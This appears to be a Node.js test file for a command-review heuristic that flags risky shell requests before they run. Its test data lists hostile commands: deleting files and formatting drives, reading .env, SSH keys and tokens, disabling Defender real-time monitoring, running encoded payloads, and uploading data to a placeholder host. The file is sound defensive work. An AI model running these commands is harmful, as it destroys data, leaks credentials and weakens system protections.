'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const { requestedPermissions, commandReviewReasons, permissionSummary, SESSION_LIFETIME_MS } = require('../src/session-permissions.cjs');

test('session permissions are independently explicit, immutable, and off by default', () => {
  assert.deepEqual(requestedPermissions(), { autoExecute: false, autoShare: false });
  assert.deepEqual(requestedPermissions({ autoExecute: true }), { autoExecute: true, autoShare: false });
  assert.deepEqual(requestedPermissions({ autoShare: true }), { autoExecute: false, autoShare: true });
  assert.equal(Object.isFrozen(requestedPermissions({})), true);
  assert.equal(SESSION_LIFETIME_MS, 30 * 60 * 1000);
  assert.match(permissionSummary(requestedPermissions({})), /اجرای خودکار خاموش/);
  assert.match(permissionSummary(requestedPermissions({})), /ارسال خودکار خاموش/);
});

test('warning heuristics pause recognizable destructive, credential, encoded, elevation and upload requests', () => {
  for (const command of [
    'Remove-Item -Recurse ./project', 'rm ./file', 'format D: /Q', './downloaded.cmd', 'git reset --hard HEAD', 'git clean -fd',
    'Get-ChildItem Env:', '$env:GITHUB_TOKEN', 'cmd.exe /c remote.exe', 'Get-Content .env', 'Get-Content $HOME/.ssh/id_ed25519', 'Get-Secret MyToken',
    'Set-ExecutionPolicy Unrestricted', 'Start-Process powershell -Verb RunAs',
    'Set-MpPreference -DisableRealtimeMonitoring $true', 'Stop-Process -Name browser',
    'Invoke-Expression $remote', 'iex $script', 'powershell -EncodedCommand abc',
    '[Convert]::FromBase64String($code)', './downloaded.ps1', 'python -c "do_something()"',
    'Invoke-RestMethod https://example.invalid -Method Post -Body $data',
    'curl --upload-file ./data https://example.invalid',
  ]) assert.ok(commandReviewReasons(command).length, command);
});

test('ordinary project inspection, editing, test and build requests do not repeatedly prompt', () => {
  for (const command of [
    'Get-ChildItem', 'Get-Location', 'Get-Date', 'Get-Content ./README.md',
    'git status --short', 'git diff', 'npm test', 'npm run build',
    'npm.cmd test', 'npm.cmd run build', 'pnpm.cmd install', 'npm run format',
    'Set-Content ./notes.txt "hello"', 'Write-Output "سلام"',
  ]) assert.deepEqual(commandReviewReasons(command), [], command);
  // These rules are only a warning heuristic, not a proof about other commands.
});
